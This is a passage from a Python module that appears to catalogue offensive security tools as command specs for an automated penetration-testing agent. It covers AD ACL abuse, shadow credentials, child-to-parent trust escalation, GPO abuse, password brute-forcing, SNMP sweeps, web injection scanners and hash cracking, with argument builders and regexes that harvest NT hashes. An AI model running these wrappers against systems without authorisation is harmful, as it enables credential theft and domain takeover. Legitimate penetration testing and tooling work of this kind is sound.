                             + _s(k.get("action", "get writable")).split(),
        install_hint="pipx install bloodyAD.",
    ),
    CommandSpec(
        name="dacledit",
        description="Read or write DACLs on an AD object (impacket). Read shows who has "
                    "rights over a target; write grants a principal FullControl over it "
                    "(ACL-abuse primitive). Needs a domain credential.",
        binary="impacket-dacledit", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "principal": {"type": "string", "description": "Principal whose rights to read/grant."},
            "acl_target": {"type": "string", "description": "Target object the ACL is on."},
            "acl_action": {"type": "string", "description": "'read' (default) or 'write'."}},
            ["target", "domain", "username", "password", "acl_target"]),
        build_args=lambda k: ["-action", _s(k.get("acl_action", "read")),
                              "-principal", _s(k.get("principal", k["username"])),
                              "-target", _s(k["acl_target"]), "-dc-ip", _s(k["target"])]
                             + (["-rights", "FullControl"] if _s(k.get("acl_action", "")) == "write" else [])
                             + [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
        aliases=["dacledit.py"], install_hint="pipx install impacket (dacledit fork).",
    ),
    CommandSpec(
        name="certipy_shadow",
        description="Shadow Credentials attack (msDS-KeyCredentialLink): when you can write "
                    "to a target account, add a key credential and authenticate as it to "
                    "recover its NT hash + TGT — no password reset needed. 'auto' adds, "
                    "authenticates, then removes the key. Needs a domain credential.",
        binary="certipy-ad", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "account": {"type": "string", "description": "Target account to take over (e.g. a computer$ or user)."}},
            ["target", "domain", "username", "password", "account"]),
        build_args=lambda k: ["shadow", "auto", "-u", f"{_s(k['username'])}@{_s(k['domain'])}",
                              "-p", _s(k["password"]), "-account", _s(k["account"]),
                              "-dc-ip", _s(k["target"]), "-ns", _s(k["target"]), "-dns-tcp"],
        harvest=[HarvestRule("nthash", r"Got hash for '[^']+':\s*[a-f0-9]{32}:([a-f0-9]{32})")],
        aliases=["certipy"], install_hint="pipx install certipy-ad.",
    ),
    CommandSpec(
        name="raisechild",
        description="Automated child-to-parent domain escalation across an intra-forest "
                    "trust: from Domain Admin in a child domain, dump the child krbtgt and "
                    "forge an inter-realm ticket with the parent Enterprise Admins SID to "
                    "reach the forest root. Needs child domain-admin credentials.",
        binary="impacket-raiseChild", category="ad-smb", host_resolver=host_from_domain,
        parameters=_params({**_DOMAIN, **_AUTH}, ["domain", "username", "password"]),
        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}"],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="lookupsid",
        description="Look up the domain SID (and RID-brute users) over MS-LSAT with a "
                    "credential or null session — the domain SID is needed to forge golden "
                    "and inter-realm (trust) tickets.",
        binary="impacket-lookupsid", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH}, ["target", "username"]),
        build_args=lambda k: [f"{_s(k.get('domain',''))}/{_s(k['username'])}:"
                              f"{_s(k.get('password',''))}@{_s(k['target'])}", "0"],
        harvest=[HarvestRule("domain_sid", r"Domain SID is:\s*(S-1-5-21-[0-9\-]+)")],
        install_hint="pipx install impacket.",
    ),
    CommandSpec(
        name="netexec_module",
        description="Run a NetExec module against a host: e.g. gpp_password (GPP cpassword), "
                    "gpp_autologin, laps (read LAPS passwords), enum_trusts (domain trusts), "
                    "get-desc-users (passwords in the description field), maq "
                    "(MachineAccountQuota). Give the protocol and module name.",
        binary="nxc", category="ad-smb",
        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
            "protocol": {"type": "string", "description": "smb or ldap (default smb)."},
            "module": {"type": "string", "description": "Module name, e.g. gpp_password, laps, enum_trusts."},
            "module_options": {"type": "string", "description": "Optional -o KEY=VALUE options."}},
            ["target", "module"]),
        build_args=lambda k: [_s(k.get("protocol", "smb")), _s(k["target"])] + _nxc_auth(k)
                             + ["-M", _s(k["module"])]
                             + (["-o"] + _s(k["module_options"]).split() if k.get("module_options") else []),
        install_hint="pipx install netexec.",
    ),

    # ---- Credentials -----------------------------------------------------
    CommandSpec(
        name="hydra",
        description="Online password brute-force against a network service "
                    "(ssh, ftp, rdp, smb, http-*). Intrusive and noisy.",
        binary="hydra",
        parameters=_params({**_TARGET,
            "service": {"type": "string", "description": "e.g. ssh, ftp, rdp, smb."},
            "userlist": {"type": "string", "description": "Path to usernames file."},
            "passlist": {"type": "string", "description": "Path to passwords file."}},
            ["target", "service", "userlist", "passlist"]),
        build_args=lambda k: ["-L", _s(k["userlist"]), "-P", _s(k["passlist"]),
                              "-t", "4", "-f", _s(k["target"]), _s(k["service"])],
        timeout=1800, install_hint="apt install hydra.",
    ),
    CommandSpec(
        name="searchsploit",
        description="Search the local Exploit-DB for known exploits matching a "
                    "product/version string. Local lookup — no target contacted.",
        binary="searchsploit",
        parameters=_params({"query": {"type": "string",
            "description": "Product and version, e.g. 'vsftpd 2.3.4'."}}, ["query"]),
        build_args=lambda k: _s(k["query"]).split(),
        requires_host=False, active=False,
        install_hint="apt install exploitdb.",
    ),

    # ==== Batch D: unauth AD roasting / GPO / net-services / web injection =
    CommandSpec(
        name="sccmhunter",
        description="Enumerate and attack SCCM/MECM (Microsoft Configuration Manager): "
                    "'find' locates the site/management/distribution servers in AD; other "
                    "modules (smb/http/admin/mssql/dpapi) recover Network Access Account "
                    "(NAA) credentials or take over the site. Needs a domain credential.",
        binary="sccmhunter", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH,
            "action": {"type": "string", "description": "sccmhunter module: find (default), "
                       "smb, http, admin, mssql, dpapi."}},
            ["target", "domain", "username", "password"]),
        build_args=lambda k: [_s(k.get("action", "find")), "-u", _s(k["username"]),
                              "-p", _s(k["password"]), "-d", _s(k["domain"]),
                              "-dc-ip", _s(k["target"])],
        timeout=900, install_hint="pipx install sccmhunter (or git clone garrettfoster13/sccmhunter).",
    ),
    CommandSpec(
        name="pre2k",
        description="Check for pre-created (pre-Windows-2000) computer accounts whose "
                    "password equals the lowercase computer name — an unauthenticated "
                    "foothold. Give a list of computer names.",
        binary="pre2k", category="ad-smb",
        parameters=_params({**_TARGET, **_DOMAIN,
            "userlist": {"type": "string", "description": "File of computer names to test."}},
            ["target", "domain"]),
        build_args=lambda k: ["unauth", "-d", _s(k["domain"]), "-dc-ip", _s(k["target"])]
                             + (["-inputfile", _s(k["userlist"])] if k.get("userlist") else []),
        install_hint="pipx install pre2k.",
    ),
    CommandSpec(
        name="timeroast",
        description="Timeroasting: request NTP authentication from the DC to extract "
                    "computer-account (and trust) password hashes UNauthenticated, then "
                    "crack them offline. No domain credentials needed.",
        binary="timeroast", category="ad-smb",
        parameters=_params(_TARGET, ["target"]),
        build_args=lambda k: [_s(k["target"])],
        aliases=["timeroast.py"], install_hint="Install timeroast (SecuraBV).",
    ),
    CommandSpec(
        name="pygpoabuse",
        description="Abuse write access to a Group Policy Object: add an immediate "
                    "scheduled task that runs as SYSTEM on every computer the GPO applies "
                    "to. Needs a credential with write over the GPO.",
        binary="pygpoabuse", category="ad-smb",
        parameters=_params({**_DOMAIN, **_AUTH,
            "gpo_id": {"type": "string", "description": "Target GPO GUID."},
            "command": {"type": "string", "description": "Command to run as SYSTEM (optional)."}},
            ["domain", "username", "password", "gpo_id"]),
        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}:{_s(k['password'])}",
                              "-gpo-id", _s(k["gpo_id"])]
                             + (["-command", _s(k["command"])] if k.get("command") else []),
        host_resolver=host_from_domain, aliases=["pygpoabuse.py"],
        install_hint="Install pyGPOAbuse.",
    ),
    CommandSpec(
        name="dalfox",
        description="Automated XSS discovery and verification on a URL/parameter.",
        binary="dalfox", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        subcommand=["url"], positional=["url"], timeout=900,
        install_hint="go install github.com/hahwul/dalfox/v2@latest.",
    ),
    CommandSpec(
        name="commix",
        description="Automated OS command-injection detection and exploitation on a URL.",
        binary="commix", category="web", host_resolver=host_from_url,
        parameters=_params({**_URL,
            "data": {"type": "string", "description": "POST body to test (optional)."}},
            ["url"]),
        build_args=lambda k: ["--url", _s(k["url"]), "--batch"]
                             + (["--data", _s(k["data"])] if k.get("data") else []),
        timeout=1200, install_hint="apt install commix.",
    ),
    CommandSpec(
        name="jwt_tool",
        description="Analyse and attack a JSON Web Token (alg confusion, none, weak key, "
                    "tampering). Local — no target contacted.",
        binary="jwt_tool", category="web", requires_host=False,
        parameters=_params({"token": {"type": "string", "description": "The JWT to test."}}, ["token"]),
        positional=["token"], install_hint="pipx install jwt-tool.",
    ),
    CommandSpec(
        name="snmp_walk",
        description="Walk SNMP (v2c) with a community string to read device config, "
                    "processes, users, and sometimes credentials.",
        binary="snmpwalk", category="recon",
        parameters=_params({**_TARGET,
            "community": {"type": "string", "description": "Community string. Default public."}},
            ["target"]),
        build_args=lambda k: ["-v2c", "-c", _s(k.get("community", "public")), _s(k["target"])],
        timeout=600, install_hint="apt install snmp.",
    ),
    CommandSpec(
        name="onesixtyone",
        description="Fast SNMP community-string brute-force / sweep to find readable "
                    "SNMP services.",
        binary="onesixtyone", category="recon",
        parameters=_params({**_TARGET,
            "community": {"type": "string", "description": "Community to try. Default public."}},
            ["target"]),
        build_args=lambda k: [_s(k["target"]), _s(k.get("community", "public"))],
        install_hint="apt install onesixtyone.",
    ),
    CommandSpec(
        name="smtp_user_enum",
        description="Enumerate valid users on an SMTP server via VRFY/EXPN/RCPT.",
        binary="smtp-user-enum", category="recon",
        parameters=_params({**_TARGET,
            "userlist": {"type": "string", "description": f"Usernames file. Default {WL_USERS}."}},
            ["target"]),
        build_args=lambda k: ["-M", "VRFY", "-U", _s(k.get("userlist", WL_USERS)),
                              "-t", _s(k["target"])],
        timeout=600, install_hint="apt install smtp-user-enum.",
    ),
    CommandSpec(
        name="nfs_shares",
        description="List NFS exports on a host (showmount -e) — world-readable exports "
                    "often leak files.",
        binary="showmount", category="recon",
        parameters=_params(_TARGET, ["target"]),
        build_args=lambda k: ["-e", _s(k["target"])],
        install_hint="apt install nfs-common.",
    ),

    # ==== Extended coverage (from the pentest cheat sheet) ================
    # ---- Recon: subdomain / OSINT / crawl (feed the host + web pipeline) --
    CommandSpec(
        name="subfinder",
        description="Passively enumerate subdomains of a domain. Discovered "
                    "subdomains are recorded as hosts for follow-up scanning.",
        binary="subfinder", category="recon", host_resolver=host_from_domain,
        parameters=_params(_DOMAIN, ["domain"]),
        flags={"domain": "-d"}, fixed=["-silent"],
        harvest=[HarvestRule("host", _SUBDOMAIN_RE, multi=True,
                             flags=_re.MULTILINE)],
        install_hint="apt install subfinder.",
    ),
    CommandSpec(
        name="amass",
        description="Enumerate subdomains (passive) with OWASP Amass. Results "
                    "are recorded as hosts.",
        binary="amass", category="recon", host_resolver=host_from_domain,
        parameters=_params(_DOMAIN, ["domain"]),
        subcommand=["enum", "-passive"], flags={"domain": "-d"},
        harvest=[HarvestRule("host", _SUBDOMAIN_RE, multi=True,
                             flags=_re.MULTILINE)],
        timeout=1200, install_hint="apt install amass.",
    ),
    CommandSpec(
        name="theharvester",
        description="OSINT gathering of subdomains and emails for a domain "
                    "from public sources.",
        binary="theHarvester", category="recon", host_resolver=host_from_domain,
        parameters=_params(_DOMAIN, ["domain"]),
        flags={"domain": "-d"}, fixed=["-b", "bing,duckduckgo,crtsh"],
        aliases=["theharvester"], install_hint="apt install theharvester.",
    ),
    CommandSpec(
        name="httpx",
        description="Probe a URL/host for a live HTTP service: status, title, "
                    "and detected technologies. Fast triage of web hosts.",
        binary="httpx-toolkit", category="recon", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        flags={"url": "-u"}, fixed=["-silent", "-title", "-tech-detect", "-status-code"],
        aliases=["httpx"], install_hint="apt install httpx-toolkit.",
    ),
    CommandSpec(
        name="katana",
        description="Crawl a website and list discovered URLs/endpoints "
                    "(feeds parameter and fuzzing tools).",
        binary="katana", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        flags={"url": "-u"}, fixed=["-silent", "-jc"],
        timeout=900, install_hint="apt install katana.",
    ),
    CommandSpec(
        name="gau",
        description="Fetch known historical URLs for a domain from the Wayback "
                    "Machine and other archives.",
        binary="gau", category="recon", host_resolver=host_from_domain,
        parameters=_params(_DOMAIN, ["domain"]),
        positional=["domain"], fixed=["--threads", "5"],
        install_hint="go install github.com/lc/gau/v2/cmd/gau@latest.",
    ),

    # ---- Web / vulnerability --------------------------------------------
    CommandSpec(
        name="feroxbuster",
        description="Fast recursive content/directory discovery on a web app.",
        binary="feroxbuster", category="web", host_resolver=host_from_url,
        parameters=_params({**_URL, **_WORDLIST}, ["url"]),
        flags={"url": "-u", "wordlist": "-w"}, fixed=["-q", "--no-state"],
        timeout=1200, install_hint="apt install feroxbuster.",
    ),
    CommandSpec(
        name="arjun",
        description="Discover hidden HTTP request parameters on a URL "
                    "(feeds SQLi/XSS testing).",
        binary="arjun", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        flags={"url": "-u"}, install_hint="pipx install arjun.",
    ),
    CommandSpec(
        name="testssl",
        description="Assess a host's SSL/TLS configuration and known TLS "
                    "vulnerabilities (Heartbleed, weak ciphers, etc.).",
        binary="testssl", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        fixed=["--quiet", "--color", "0"], positional=["url"],
        aliases=["testssl.sh"], timeout=1200, install_hint="apt install testssl.sh.",
    ),
    CommandSpec(
        name="subzy",
        description="Check a URL/subdomain for subdomain-takeover conditions.",
        binary="subzy", category="web", host_resolver=host_from_url,
        parameters=_params(_URL, ["url"]),
        subcommand=["run"], flags={"url": "--target"},
        install_hint="go install github.com/PentestPad/subzy@latest.",
    ),

    # ---- Credentials: hash cracking (closes the AD roasting loop) --------
    CommandSpec(
        name="john",
        description="Crack a file of hashes with John the Ripper using a "
                    "wordlist (auto-detects many formats, incl. Kerberos).",
        binary="john", category="credentials", requires_host=False,
        parameters=_params({**_HASHFILE, **_WORDLIST}, ["hashfile"]),
        positional=["hashfile"],
        flags={"wordlist": "--wordlist"},
        install_hint="apt install john.",
    ),
    CommandSpec(
        name="hashcat",
        description="GPU/CPU hash cracking. Provide the hashcat mode (-m), the "
                    "hash file, and a wordlist.",
        binary="hashcat", category="credentials", requires_host=False,
        parameters=_params({**_HASHFILE, **_WORDLIST,
            "mode": {"type": "string", "description": "hashcat -m mode, e.g. 13100 (TGS), 18200 (AS-REP), 1000 (NTLM)."}},
            ["hashfile", "mode"]),
        flags={"mode": "-m"}, positional=["hashfile", "wordlist"],
        fixed=["--quiet"], install_hint="apt install hashcat.",
    ),
    CommandSpec(
        name="hashid",
        description="Identify the likely type/algorithm of hashes in a file.",
        binary="hashid", category="credentials", requires_host=False,
        parameters=_params(_HASHFILE, ["hashfile"]),
        positional=["hashfile"], active=False, install_hint="apt install hashid.",
    ),
]

# Classify each catalogued tool into a category (used for grouped listings).
_CATEGORIES = {
    "recon": ["masscan", "dns_recon"],
    "web": ["whatweb", "nikto", "nuclei", "ffuf", "gobuster_dir", "wpscan",
            "sqlmap"],
    "ad-smb": ["netexec_smb", "netexec_rid_brute", "netexec_spray", "smb_get",
               "netexec_winrm", "netexec_ldap", "netexec_mssql", "enum4linux",
               "smbmap", "smbclient_shares", "ldapsearch_anon",
               "kerbrute_userenum", "asrep_roast", "kerberoast",
               "add_computer", "rbcd", "get_st", "getTGT", "ticketer",
               "certipy_find", "certipy_req", "certipy_auth", "certipy_shadow",
               "coercer", "finddelegation", "targeted_kerberoast", "bloodyad",
               "dacledit", "raisechild", "lookupsid", "netexec_module",
               "bloodhound_python", "secretsdump"],
    "credentials": ["hydra", "john", "hashcat", "hashid"],
    "exploit": ["searchsploit"],
}
_NAME_TO_CATEGORY = {n: c for c, names in _CATEGORIES.items() for n in names}
for _spec in CATALOG:
    # Respect a category set explicitly on the spec; otherwise use the map.
    if _spec.category == "misc":
        _spec.category = _NAME_TO_CATEGORY.get(_spec.name, "misc")

# Display order for grouped output.
CATEGORY_ORDER = ["recon", "web", "ad-smb", "credentials", "exploit", "misc"]
